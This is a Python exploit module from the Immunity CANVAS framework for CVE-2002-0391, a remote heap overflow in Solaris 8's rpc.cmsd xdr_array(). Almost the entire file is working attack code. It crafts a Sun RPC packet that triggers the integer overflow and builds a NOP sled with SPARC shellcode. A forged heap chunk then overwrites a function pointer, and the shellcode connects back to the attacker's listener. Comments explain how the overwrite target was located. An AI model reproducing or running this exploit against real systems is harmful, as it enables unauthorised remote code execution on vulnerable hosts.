#! /usr/bin/env python
"""

rpc.cmsd xdr_array() heap overflow for Solaris 

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2003
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.2"

CHANGES="""
1.2 
Added test()

1.1
Fixed cmsd_ping to not take 3 seconds and use select()

"""


notes="""

"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: dave@immunityinc.com
#

import os,getopt
import sys


if "." not in sys.path: sys.path.append(".")


import socket
from exploitutils import *
sys.path.append('encoder')
import addencoder
sys.path.append("shellcode")
from shellcode import win32shell
import time
from tcpexploit import tcpexploit
import urllib
from sunrpc import *
import random
import xdrlib
import canvasengine


NAME="cmsd_xdrarray"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Date public"]="Jul 30, 2002"
DOCUMENTATION["CERT Advisory"]="http://www.cert.org/advisories/CA-2002-25.html"
DOCUMENTATION["CVE Name"] = "CVE-2002-0391"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0391"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert%2F46122"

DESCRIPTION="rpc.cmsd xdr_array heap overflow"

VERSION="1.0"

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Solaris", "sparc"] ]
PROPERTY["VERSION"]= ["8"] 

GTK2_DIALOG="dialog.glade2"


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit



CMSD_PING=0
CMSD_GET_ENTRY_ATTR=15
CMSD_PROGRAM=100068
CMSD_VERSION=5

import time
def cmsd_ping(host,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((host, port))
    header=SRPCCallHeaderUDP(CMSD_PROGRAM,CMSD_VERSION,CMSD_PING)
    s.send(header)
    #print "Sleeping for 3 seconds to recv ping"
    import select
    retList=select.select([s],[],[],2.0)
    if s not in retList[0]: 
        return 0
    #our socket has data waiting...
    data=sunrpc_recv_udp(s)
    if len(data)<24:
        return 0
    value=str2bigendian(data[20:24])
    #print "Value=%d"%value
    if value==0:
        return 1
    return 0


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.setPort(0)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x00\\/.:?\r\n%?"
        self.name=NAME
        return

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        print "Calling back to %s:%s"%(host, port)
        return self.createSparcShellcode(self.badstring, host, port)
       
    def neededListenerTypes(self):
        return [canvasengine.SOLARISSPARCMOSDEF]

    def test(self):
        host=self.host
        port=self.port
        if port==0:
            port=SRPCgetport(host,CMSD_PROGRAM,CMSD_VERSION,"UDP")
            if port==0 or port==None:
                self.log("Couldn't get a port for cmsd!")
                return 0
        self.log("CMSD is on UDP port %d"%port)
        return 1
        
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))

        if self.port==0:
            port=SRPCgetport(self.host,CMSD_PROGRAM,CMSD_VERSION,"UDP")
            if port==0 or port==None:
                self.log("Couldn't get a port for cmsd!")
                self.setInfo("%s attacking %s:%d (done)"%(NAME,self.host,self.port))
                return 0
            self.port=port
        for i in range(0,3):
            self.dorun()
            time.sleep(1)
        self.setInfo("%s attacking %s:%d (done)"%(NAME,self.host,self.port))


        return
            
    def dorun(self):
        host=self.host
        port=self.port
        
        self.log("CMSD is on UDP port %d"%port)
        time.sleep(1)
        cmsd_ping(host,port)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host, port))
        #header=SRPCCallHeaderUDP(CMSD_PROGRAM,CMSD_VERSION,CMSD_GET_ENTRY_ATTR)
        body=self.makesploit()
        s.send(body)
                
        return 0
    
    #returns the sploitstring
    def makesploit(self):
        data=""
        host="localhost"
        
        XID=random.randint(1,sys.maxint-1)
        data+=big_order(XID)
        data+="\x00\x00\x00\x00\x00\x00\x00\x02"
        data+=big_order(CMSD_PROGRAM)
        data+=big_order(CMSD_VERSION)
        data+=big_order(CMSD_GET_ENTRY_ATTR)                        
        data+=big_order(1)
        data+=big_order(20+len(host)+3)
        data+=big_order(55555)
        data+=big_order(len(host))+host+"\x00"*3
        data+="\x00\x00\x00\x00"
        data+="\x00\x00\x00\x00"
        data+="\x00\x00\x00\x00"
        data+="\x00\x00\x00\x00"                
        data+="\x00\x00\x00\x00"
        #end of header
        
        p=xdrlib.Packer()
        p.pack_string("A"*10)
        extra=0
        padding=7
        #num keys is what passes us through the integer overflow
        #we want it to be 0xffffffff/8+size of our buffer+1
        #I dunno why the +1
        #
        num_keys=4294967295/8+(128*4)+1+extra*4
        self.log("num_keys is %8x"%num_keys)
        p.pack_int(num_keys)
        p.pack_int(1)
        
        nop=big_order(0x801bc00fL)
        dummy=0xfffffff0L
        nop1=0x801bc00fL
        nop2=0x20bfffffL

        retloc=0xff325c44L-0x8
        #retloc=0x01020304-0x8
        return_addr=0xa27e4L
        #We can't write to the PLT because we'll die in t_delete() since
        #our opcode is not a writable address
        #return_inst=(retloc-return_addr)/4+0x40000000
        #self.log("Our SPARC opcode is %8x"%return_inst)
        #instead, we write over a xdr function pointer that we found with
        #setting a breakpoint at 
        #4   breakpoint     keep y   0x0003ab68 <program+328>
        #3   breakpoint     keep y   0x0003ab90 <program+368>
        #which we found with a few "up" commands and disassembling until
        #we saw a call $l0 (call a function pointer)
        #this used ($g2+8) which gave us the address to overwrite with our shellcode address



        neg=-1
        p.pack_int(dummy)
        #we need to pad with one nop in case our alignment is off...
        shellcode=nop+self.shellcode
        for i in range(0,4056-(len(shellcode)-1),4):
            if i%8!=0:
                p.pack_int(nop1)
            else:
                p.pack_int(nop2)
        #ok, now copy the shellcode
        #print "Length of Shellcode is %d"%(len(shellcode))
        #print prettyprint(shellcode)
        for i in range(0,len(shellcode)-1,4):
            #print "Here, but should not be."
            p.pack_fopaque(4,shellcode[i:i+4])
        for i in range(0,padding):
            p.pack_int(-1)
        for i in range(0,extra):
            p.pack_int(-1)
        p.pack_int(neg)
        p.pack_int(dummy)
        #start chunk header
        p.pack_int(dummy)
        #return_inst must be a WRITABLE address! 
        p.pack_int(return_addr)
        p.pack_int(neg)
        p.pack_int(neg)
        p.pack_int(dummy)
        p.pack_int(dummy)
        p.pack_int(neg)
        p.pack_int(retloc)
        
        #num names
        p.pack_int(0)
        #null
        p.pack_int(0)
        
        data+=p.get_buffer()

        #data=big_order(len(data) | 0x80000000)+data
        return data


    def displayVersions(self):
        print "1 : Solaris 8 Ultra "
        return

#this stuff happens.
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

